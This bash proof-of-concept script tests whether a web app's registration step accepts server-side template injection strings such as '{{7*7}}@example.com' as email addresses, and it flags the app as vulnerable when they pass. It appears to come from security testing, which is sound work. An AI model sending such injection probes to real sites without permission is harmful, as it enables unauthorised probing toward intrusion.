#!/bin/bash

# POC: Email Template Injection Payload Acceptance
# Target: /accounts/register/step2/
# Objective: Demonstrate that template injection syntax is accepted as valid email

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/accounts/register/step2/"

echo "[*] Testing Email Template Injection Payload Acceptance"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test payloads with template injection syntax
declare -a PAYLOADS=(
    "{{7*7}}@example.com"
    "\${7*7}@example.com"
    "{%7*7%}@example.com"
    "test+{{7*7}}@example.com"
)

# First, get a valid session by visiting the form
echo "[*] Step 1: Attempting to get session cookie..."
COOKIES=$(mktemp)
curl -s -c "$COOKIES" "${TARGET_URL}/accounts/register/step1/" > /dev/null

if [ ! -s "$COOKIES" ]; then
    echo "[-] Failed to get session cookie"
    rm -f "$COOKIES"
    exit 1
fi

echo "[+] Session cookie obtained"
echo ""

# Test each payload
for payload in "${PAYLOADS[@]}"; do
    echo "[*] Testing payload: $payload"
    
    # Submit the email with template injection payload
    response=$(curl -s -b "$COOKIES" -w "\n%{http_code}" \
        -X POST \
        "${TARGET_URL}${ENDPOINT}" \
        -d "email=${payload}" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Extract HTTP status code
    http_code=$(echo "$response" | tail -n 1)
    response_body=$(echo "$response" | sed '$d')
    
    echo "    HTTP Status: $http_code"
    
    # Check if payload was accepted (200 OK or 302 redirect indicates acceptance)
    if [[ "$http_code" == "200" ]] || [[ "$http_code" == "302" ]]; then
        echo "    [+] VULNERABLE: Template injection payload accepted!"
        
        # Check for redirect to step 3 (indicates form validation passed)
        if echo "$response_body" | grep -q "step3" || [[ "$http_code" == "302" ]]; then
            echo "    [+] Payload passed validation and redirected to next step"
        fi
    else
        echo "    [-] Payload rejected (HTTP $http_code)"
    fi
    echo ""
done

# Clean up
rm -f "$COOKIES"

echo "[*] POC Complete"